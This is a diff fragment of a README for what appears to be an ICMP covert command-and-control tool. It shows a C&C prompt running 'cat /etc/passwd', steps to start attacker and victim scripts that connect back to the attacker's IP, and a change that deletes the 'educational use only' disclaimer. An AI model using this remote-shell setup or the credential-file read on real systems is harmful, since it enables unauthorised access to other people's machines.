@@ -386,9 +386,3 @@ C&C> cat /etc/passwd
 2. Run attacker: `sudo python3 attacker/attacker_icmp.py -a`
 3. Run victim: `sudo python3 victim/victim_icmp.py <your_ip>`
 4. Issue command: Type `whoami` when prompted
-
-## License & Disclaimer
-
-**⚠️ EDUCATIONAL USE ONLY** - For security research and authorized penetration testing only.
-
-See [LICENSE](LICENSE) for details. Built with [Scapy](https://scapy.net/).
